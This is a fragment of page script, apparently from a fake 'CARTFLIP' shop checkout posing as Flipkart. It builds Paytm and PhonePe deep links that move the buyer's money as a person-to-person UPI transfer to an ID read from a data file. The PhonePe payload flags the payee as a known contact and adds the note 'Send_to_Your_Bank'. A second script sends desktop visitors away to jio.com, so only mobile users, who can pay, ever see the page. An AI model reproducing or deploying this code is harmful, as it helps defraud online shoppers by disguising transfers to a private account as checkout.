   <script>
      fetch('./../../data/info.json')
        .then(res => res.json())
        .then(data => {

          var upiId = data.name;
          var tr = data.email;

          var urlParams = new URLSearchParams(window.location.search);
          var amount = urlParams.get("amount") || "0";

          document.getElementById("updatedamount").innerHTML = amount;

          /* ===== PAYTM (UNCHANGED LOGIC) ===== */
          document.getElementById("paytm").onclick = function () {
            window.location.href =
              `paytmmp://cash_wallet?pa=${upiId}&pn=CARTFLIP&am=${amount}&cu=INR&tn=${tr}&featuretype=money_transfer`;
          };

          /* ===== PHONEPE (MAIN CODE STYLE – NATIVE) ===== */
          document.getElementById("phonepe").onclick = function (e) {
            e.preventDefault();

            const phonePeAmount = Math.round(parseFloat(amount) * 100);

            const payload = {
              contact: {
                cbsName: "",
                nickName: "",
                vpa: upiId,
                type: "VPA"
              },
              p2pPaymentCheckoutParams: {
                note: "Send_to_Your_Bank",
                isByDefaultKnownContact: true,
                initialAmount: phonePeAmount,
                currency: "INR",
                checkoutType: "DEFAULT",
                transactionContext: "p2p"
              }
            };

            const base64 = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
            const deeplink =
              `phonepe://native?data=${encodeURIComponent(base64)}&id=p2ppayment`;

            window.location.href = deeplink;
          };

        });
    </script>


     
    <script>
      // Function to detect if the device is a desktop or laptop
      function isDesktopOrLaptop() {
        return !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
          navigator.userAgent
        );
      }

      // Function to redirect to Flipkart
      function redirectToFlipkart() {
        window.location.href = "https://www.jio.com/"; // Redirect to Flipkart URL
      }

      // Check if the device is a desktop or laptop and redirect if true
      if (isDesktopOrLaptop()) {
        redirectToFlipkart();
      }
    </script>
